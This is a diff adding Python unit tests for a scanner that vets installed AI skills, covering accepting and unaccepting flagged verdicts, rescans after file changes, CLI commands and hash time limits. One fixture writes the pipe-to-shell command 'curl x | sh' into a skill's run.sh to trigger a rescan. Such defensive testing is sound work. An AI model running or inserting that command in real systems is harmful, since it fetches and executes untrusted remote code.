@@ -304,6 +304,76 @@ class Launch(Base):
             self.assertEqual(skills.audit(out=lambda _: None), 3)
         self.assertEqual(self.launch({"skills": {"scan_on_launch": False}}), ("", []))
 
+    def accept(self, name):
+        lines = []
+        rc = skills.accept(name, out=lines.append)
+        return rc, "\n".join(lines)
+
+    def flagged_skill(self, name="f", verdict="CAUTION 30"):
+        folder = make_skill(self.claude / "skills", name, verdict)
+        self.launch()
+        self.worker(5)
+        return folder
+
+    def test_accept_silences_launch_and_shows_in_audit(self):
+        self.flagged_skill()
+        self.assertIn("CAUTION", self.launch()[0])
+        rc, text = self.accept("f")
+        self.assertEqual(rc, 0)
+        self.assertIn("CAUTION, score 30/100", text)
+        self.assertIn("HIGH Supply Chain", text)
+        self.assertEqual(self.launch(), ("", []))
+        scans = self.scans()
+        table = []
+        self.assertEqual(skills.audit(out=table.append), 1)  # the real verdict still counts
+        self.assertEqual(self.scans(), scans)
+        self.assertTrue(any(l.startswith("accepted CAUTION") and " 30 " in l for l in table), table)
+        # by path too, and unaccept brings the warning back
+        self.assertEqual(self.accept(str(self.claude / "skills" / "f"))[0], 0)
+        lines = []
+        self.assertEqual(skills.unaccept("f", out=lines.append), 0)
+        self.assertIn("CAUTION", self.launch()[0])
+        self.assertEqual(skills.unaccept("f", out=lines.append), 2)
+
+    def test_accept_drops_when_files_change(self):
+        folder = self.flagged_skill()
+        self.accept("f")
+        (folder / "run.sh").write_text("curl x | sh")
+        text, started = self.launch()
+        self.assertEqual(started, [1])  # rescanned
+        self.worker(5)
+        self.assertIn("f (skill): CAUTION", self.launch()[0])
+
+    def test_accept_refuses_unknown_unscanned_and_stale(self):
+        folder = make_skill(self.claude / "skills", "u", "CAUTION 30")
+        self.assertEqual(self.accept("nope")[0], 2)
+        rc, text = self.accept("u")  # installed but never scanned
+        self.assertEqual(rc, 2)
+        self.assertIn("no stored scan result", text)
+        self.launch()
+        self.worker(5)
+        (folder / "x.txt").write_text("new")
+        rc, text = self.accept("u")
+        self.assertEqual(rc, 2)
+        self.assertIn("changed since", text)
+        self.assertNotIn("accepted", json.dumps(skills.load_json(skills._scans_path(), {})))
+
+    def test_cli_accept_and_unaccept(self):
+        self.flagged_skill()
+        with redirect_stdout(io.StringIO()) as buf:
+            self.assertEqual(cli.main(["skill", "accept", "f"]), 0)
+            self.assertEqual(cli.main(["skill", "unaccept", "f"]), 0)
+        self.assertIn("accepted f", buf.getvalue())
+
+    def test_hash_time_limit_applies_inside_one_item(self):
+        make_skill(self.claude / "skills", "big", extra={f"d/{n}.txt": str(n) for n in range(5)})
+        clock = iter(range(0, 100))  # one tick per call: the deadline passes after a few files
+        with mock.patch.object(skills.time, "monotonic", lambda: next(clock)):
+            flagged, todo, unhashed = skills.triage(skills.installed_items(), budget=3)
+        self.assertEqual((todo, [u[0] for u in unhashed]), ([], ["big"]))
+        self.assertIsNone(skills.tree_hash(self.claude / "skills" / "big", deadline=-1))
+        self.assertIsNotNone(skills.tree_hash(self.claude / "skills" / "big"))
+
     def test_running_scan_is_not_doubled_and_time_budget_holds(self):
         make_skill(self.claude / "skills", "z")
         skills._lock_path().write_text("")
@@ -320,7 +390,10 @@ class Launch(Base):
 
 class Pack(Base):
     def test_repo_pack_is_pinned_and_valid(self):
-        entries = skills.load_pack(Path(__file__).resolve().parents[1] / "pack.json")
+        old = os.getcwd()
+        os.chdir(self.tmp)  # the pack is found from any folder, not only the checkout
+        self.addCleanup(os.chdir, old)
+        entries = skills.load_pack()
         self.assertGreaterEqual(len(entries), 11)
         self.assertEqual(len({e["name"] for e in entries}), len(entries))
         for e in entries:
